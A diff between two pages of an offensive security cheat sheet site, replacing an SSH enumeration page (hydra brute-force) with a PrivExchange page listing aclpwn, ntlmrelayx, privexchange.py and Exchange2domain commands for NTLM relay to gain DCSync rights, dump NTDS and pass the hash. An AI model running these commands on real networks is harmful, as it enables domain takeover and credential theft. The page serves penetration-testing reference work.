@@ -5,8 +5,8 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-11-10T13:28:46 CET">
-<title>22 - SSH :: Offensive Security Cheatsheet</title>
+<meta name="revised" content="2019-11-10T13:28:58 CET">
+<title>PrivExchange :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
 <link href="/css/nucleus.css" rel="stylesheet">
@@ -23,7 +23,7 @@
 
     
   </head>
-  <body data-url="/recon-enumeration/services-enumeration/22_ssh/">
+  <body data-url="/windows-systems/privilege-escalation/privexchange/">
     
       <header>
   <div class="logo">
@@ -341,11 +341,10 @@
     </li>
         </ul>
     </li>
-    <li data-nav-id="/recon-enumeration/" class="dd-item parent haschildren
+    <li data-nav-id="/recon-enumeration/" class="dd-item haschildren
         ">
       <div>
-      <a href="/recon-enumeration/">Recon - Enumeration</a>
-            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      <a href="/recon-enumeration/">Recon - Enumeration</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
     <li data-nav-id="/recon-enumeration/application-scans/" class="dd-item haschildren
@@ -406,11 +405,10 @@
     </li>
         </ul>
     </li>
-    <li data-nav-id="/recon-enumeration/services-enumeration/" class="dd-item parent haschildren
+    <li data-nav-id="/recon-enumeration/services-enumeration/" class="dd-item haschildren
         ">
       <div>
-      <a href="/recon-enumeration/services-enumeration/">Services Enumeration</a>
-            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      <a href="/recon-enumeration/services-enumeration/">Services Enumeration</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
       <li data-nav-id="/recon-enumeration/services-enumeration/21_ftp/" class="dd-item">
@@ -420,7 +418,7 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
-      <li data-nav-id="/recon-enumeration/services-enumeration/22_ssh/" class="dd-item active">
+      <li data-nav-id="/recon-enumeration/services-enumeration/22_ssh/" class="dd-item">
         <div>
           <a href="/recon-enumeration/services-enumeration/22_ssh/">
             22 - SSH
@@ -866,10 +864,11 @@
     </li>
         </ul>
     </li>
-    <li data-nav-id="/windows-systems/" class="dd-item haschildren
+    <li data-nav-id="/windows-systems/" class="dd-item parent haschildren
         ">
       <div>
-      <a href="/windows-systems/">Windows Systems</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      <a href="/windows-systems/">Windows Systems</a>
+            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
     <li data-nav-id="/windows-systems/network-and-domain-recon/" class="dd-item haschildren
@@ -987,10 +986,11 @@
     </li>
         </ul>
     </li>
-    <li data-nav-id="/windows-systems/privilege-escalation/" class="dd-item haschildren
+    <li data-nav-id="/windows-systems/privilege-escalation/" class="dd-item parent haschildren
         ">
       <div>
-      <a href="/windows-systems/privilege-escalation/">Privilege Escalation</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      <a href="/windows-systems/privilege-escalation/">Privilege Escalation</a>
+            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
       <li data-nav-id="/windows-systems/privilege-escalation/admin_processes/" class="dd-item">
@@ -1021,7 +1021,7 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
-      <li data-nav-id="/windows-systems/privilege-escalation/privexchange/" class="dd-item">
+      <li data-nav-id="/windows-systems/privilege-escalation/privexchange/" class="dd-item active">
         <div>
           <a href="/windows-systems/privilege-escalation/privexchange/">
             PrivExchange
@@ -1333,37 +1333,7 @@
     <option value="/open-source-intelligence-osint/" >
    Open Source Intelligence (OSINT)</option>
     <option value="/recon-enumeration/" >
-   Recon - Enumeration</option> 
-    <option value="/recon-enumeration/application-scans/" >
-  - 
-   Applications Scans</option>
-    <option value="/recon-enumeration/port-scanning/" >
-  - 
-   Ports Scanning</option>
-    <option value="/recon-enumeration/services-enumeration/" >
-  - 
-   Services Enumeration</option> 
-      <option value="/recon-enumeration/services-enumeration/21_ftp/" >-- 21 - FTP</option>
-      <option value="/recon-enumeration/services-enumeration/22_ssh/"  selected>-- 22 - SSH</option>
-      <option value="/recon-enumeration/services-enumeration/25_smtp/" >-- 25 - SMTP</option>
-      <option value="/recon-enumeration/services-enumeration/53_dns/" >-- 53 - DNS</option>
-      <option value="/recon-enumeration/services-enumeration/80_443_https/" >-- 80/443 - HTTP/HTTPS</option>
-      <option value="/recon-enumeration/services-enumeration/110_pop3/" >-- 110 - POP3</option>
-      <option value="/recon-enumeration/services-enumeration/119_nntp/" >-- 119 - NTP</option>
-      <option value="/recon-enumeration/services-enumeration/135_rpc/" >-- 135 - RPC</option>
-      <option value="/recon-enumeration/services-enumeration/139_445_smb/" >-- 139/445 - SMB</option>
-      <option value="/recon-enumeration/services-enumeration/143_imap/" >-- 143 - IMAP</option>
-      <option value="/recon-enumeration/services-enumeration/161_162_snmp/" >-- 161/162 - SNMP</option>
-      <option value="/recon-enumeration/services-enumeration/389_636_3269_ldap/" >-- 389/636/3269 - LDAP</option>
-      <option value="/recon-enumeration/services-enumeration/995_pop3s/" >-- 995 - POP3S</option>
-      <option value="/recon-enumeration/services-enumeration/1025_nfs_iis/" >-- 1025 - NFS/IIS</option>
-      <option value="/recon-enumeration/services-enumeration/1433_mssql/" >-- 1433 - MSSQL</option>
-      <option value="/recon-enumeration/services-enumeration/1721_vpn/" >-- 1721 - VPN</option>
-      <option value="/recon-enumeration/services-enumeration/3306_mysql/" >-- 3306 - MySQL</option>
-      <option value="/recon-enumeration/services-enumeration/3389_rdp/" >-- 3389 - RDP</option>
-      <option value="/recon-enumeration/services-enumeration/4555_rsip/" >-- 4555 - RSIP</option>
-  
-  
+   Recon - Enumeration</option>
     <option value="/web-attacks/" >
    Web vulnerabilities &amp; attacks</option>
     <option value="/network/" >
@@ -1371,7 +1341,29 @@
     <option value="/shells-methods/" >
    Shells methods</option>
     <option value="/windows-systems/" >
-   Windows Systems</option>
+   Windows Systems</option> 
+    <option value="/windows-systems/network-and-domain-recon/" >
+  - 
+   Network and Domain Recon</option>
+    <option value="/windows-systems/local-and-physical/" >
+  - 
+   Local and Physical</option>
+    <option value="/windows-systems/exploitation/" >
+  - 
+   Exploitation</option>
+    <option value="/windows-systems/privilege-escalation/" >
+  - 
+   Privilege Escalation</option> 
+      <option value="/windows-systems/privilege-escalation/admin_processes/" >-- Admin and Processes</option>
+      <option value="/windows-systems/privilege-escalation/lsass_mimikatz/" >-- LSASS and Mimikatz</option>
+      <option value="/windows-systems/privilege-escalation/tricks/" >-- Tricks</option>
+      <option value="/windows-systems/privilege-escalation/windows_defender/" >-- Windows Defender</option>
+      <option value="/windows-systems/privilege-escalation/privexchange/"  selected>-- PrivExchange</option>
+  
+    <option value="/windows-systems/post-exploitation-techniques/" >
+  - 
+   Post Exploitation Techniques</option>
+  
     <option value="/linux-systems/" >
    Linux Systems</option>
     <option value="/other-systems/" >
@@ -1408,35 +1400,64 @@
       </div>
     
 
-    <h1>22 - SSH</h1>
+    <h1>PrivExchange</h1>
     
     
     
     
 
-<h3 id="recon">Recon</h3>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Banner grabbing using telnet</span>
-telnet IP <span style="color:#ae81ff">22</span></code></pre></div>
+<h3 id="resources">Resources</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">https://github.com/dirkjanm/PrivExchange
+https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/
+https://chryzsh.github.io/exploiting-privexchange/
+
+<span style="color:#75715e"># After exploitation, you won&#39;t be like Domain Admin directly, so, you won&#39;t be able to connect to the</span>
+<span style="color:#75715e"># DC using Domain Admins rights.</span>
+<span style="color:#75715e"># Exploitation allows user to get DCSync privileges, which is enough to get the NTDS Database</span>
+<span style="color:#75715e"># You can then use Pass the Hash attack with administrators accounts to get real access</span></code></pre></div>
 <p><br/></p>
 
-<h3 id="bruteforce">Bruteforce</h3>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># List of users using wordlists</span>
-hydra -L users.txt -P &lt;passwordList&gt; -t <span style="color:#ae81ff">3</span> -s port &lt;IP&gt; ssh
+<h3 id="aclpwn">Aclpwn</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># ACLpwn is a tool used to find compromission paths inside BloodHound data and to exploit them</span>
+<span style="color:#75715e"># BloodHound need to be running</span>
+<span style="color:#75715e"># Many options are available</span>
 
-<span style="color:#75715e"># Only one user and wordlist passwords</span>
-hydra -l root -P &lt;passwordList&gt; -t <span style="color:#ae81ff">3</span> -s port &lt;IP&gt; ssh</code></pre></div>
+<span style="color:#75715e"># Dry option is used to look for compromission without exploiting it</span>
+python aclpwn.py -f user@domain.com -ft user -d domain.com -u user -p password -sp password -du neo4j -dp password -dry
+
+<span style="color:#75715e"># Default, exploitation is started</span>
+python aclpwn.py -f user@domain.com -ft user -d domain.com -u user -p password -sp password -du neo4j -dp password
+
+<span style="color:#75715e"># You can restore previous privileges after exploitation</span>
+python aclpwn.py -r restore-file</code></pre></div>
 <p><br/></p>
 
-<h3 id="openssl">OpenSSL</h3>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Connection through openssl</span>
-openssl s_client -connect IP:PORT</code></pre></div>
+<h3 id="ntlmrelayx-privexchange-py">ntlmrelayx / privexchange.py</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># NTLM relaying is used to relay connexion and give DCSync privileges</span>
+ntlmrelayx.py -t ldap://s2016dc.testsegment.local --escalate-user ntu
+
+<span style="color:#75715e"># User need to have a mailbox to exploit this way</span>
+<span style="color:#75715e"># After a minute (which is the value supplied for the push notification) you can get results in ntlmrelayx</span>
+python privexchange.py -ah dev.testsegment.local s2012exc.testsegment.local -u testuser -d testsegment.local
+
+<span style="color:#75715e"># You can also perform the attack without getting any credentials</span>
+<span style="color:#75715e"># Using the httpattack.py file</span>
+<span style="color:#75715e"># It uses NTLM Relaying with LLMNR / NBT-NS to relay captured credentials over the network</span></code></pre></div>
+<p><br/></p>
+
+<h3 id="exchange2domain">Exchange2domain</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># All in One tools of privexchange</span>
+<span style="color:#75715e"># You only need to open the web server port, so no high privileges are required.</span>
+
+<span style="color:#75715e"># Many options available</span>
+python Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d domain.com -th DCip MailServerip</code></pre></div>
 
     
     
         <div class="chevrons">
     <div id="navigation">
-<a class="nav nav-prev" href="/recon-enumeration/services-enumeration/21_ftp/" title="21 - FTP"> <i class="fa fa-chevron-left"></i><label>21 - FTP</label></a>
-    <a class="nav nav-next" href="/recon-enumeration/services-enumeration/25_smtp/" title="25 - SMTP" style="margin-right: 0px;"><label>25 - SMTP</label><i class="fa fa-chevron-right"></i></a></div>
+<a class="nav nav-prev" href="/windows-systems/privilege-escalation/windows_defender/" title="Windows Defender"> <i class="fa fa-chevron-left"></i><label>Windows Defender</label></a>
+    <a class="nav nav-next" href="/windows-systems/post-exploitation-techniques/" title="Post Exploitation Techniques" style="margin-right: 0px;"><label>Post Exploitation Techniques</label><i class="fa fa-chevron-right"></i></a></div>
   </div>
 
   </section>
@@ -1453,7 +1474,7 @@ openssl s_client -connect IP:PORT</code></pre></div>
 
     
     <div class="github-link">
-      <a href="https://github.com/vjeantet/hugo-theme-docdock/edit/master/exampleSite/content/Recon%20-%20Enumeration/Services%20Enumeration/22_SSH.md" target="blank"><i class="fa fa-code-fork"></i>
+      <a href="https://github.com/vjeantet/hugo-theme-docdock/edit/master/exampleSite/content/Windows%20Systems/Privilege%20Escalation/PrivExchange.md" target="blank"><i class="fa fa-code-fork"></i>
         Improve this page</a>
     </div>
     
